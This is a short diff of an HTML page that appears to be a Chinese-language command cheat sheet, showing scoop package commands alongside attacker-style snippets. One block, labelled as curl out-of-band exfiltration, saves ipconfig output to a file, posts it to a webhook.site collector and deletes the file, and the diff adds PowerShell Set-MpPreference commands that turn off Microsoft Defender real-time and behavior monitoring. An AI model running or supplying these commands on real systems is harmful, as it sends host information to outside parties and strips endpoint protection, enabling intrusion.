@@ -113,4 +113,6 @@ scoop search &lt;想要安装的软件&gt;
 scoop bucket add &lt;想要安装的软件所在的bucket&gt;
 scoop install &lt;想要安装的软件&gt;
 </code><button class="copy-code-button">复制</button></pre></div><div class="el-p"><p dir="auto">curl 命令外带</p></div><div class="el-pre"><pre><code data-line="0">ipconfig &gt;D:\111.txt &amp;&amp; curl -F data=@D:\111.txt  https://webhook.site/062ed8c9-31db-4a54-a662-61d88f6c92a6 &amp;&amp; del D:\111.txt
+</code><button class="copy-code-button">复制</button></pre></div><div class="el-p"><p dir="auto">powershell临时关闭defender实时保护和行为检测</p></div><div class="el-pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">powershell <span class="token function">Set-MpPreference</span> <span class="token operator">-</span>DisableRealtimeMonitoring <span class="token boolean">$true</span>
+powershell <span class="token function">Set-MpPreference</span> <span class="token operator">-</span>DisableBehaviorMonitoring <span class="token boolean">$true</span>
 </code><button class="copy-code-button">复制</button></pre></div><div class="mod-footer mod-ui"></div></div></div></body></html>
